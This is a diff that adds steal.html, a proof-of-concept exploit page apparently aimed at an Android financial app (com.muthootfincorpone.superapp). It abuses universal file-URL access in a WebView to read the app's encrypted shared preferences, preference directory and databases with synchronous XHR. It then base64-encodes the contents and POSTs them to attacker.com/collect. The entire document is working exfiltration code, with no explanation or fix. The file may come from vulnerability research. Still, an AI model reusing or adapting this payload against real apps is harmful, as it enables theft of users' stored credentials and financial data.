@@ -1,0 +1,22 @@
+<!-- steal.html — exfiltrates EncryptedSharedPreferences via XHR using universal file access -->
+<html>
+<body>
+<script>
+  var targets = [
+    "file:///data/data/com.muthootfincorpone.superapp/shared_prefs/MFLEncryptedPrefs.xml",
+    "file:///data/data/com.muthootfincorpone.superapp/shared_prefs/",
+    "file:///data/data/com.muthootfincorpone.superapp/databases/"
+  ];
+
+  targets.forEach(function(path) {
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", path, false);  // sync read — allowed because setAllowUniversalAccessFromFileURLs=true
+    xhr.send();
+    // Exfiltrate to attacker server
+    var exfil = new XMLHttpRequest();
+    exfil.open("POST", "https://attacker.com/collect", false);
+    exfil.send("path=" + path + "&data=" + btoa(xhr.responseText));
+  });
+</script>
+</body>
+</html>
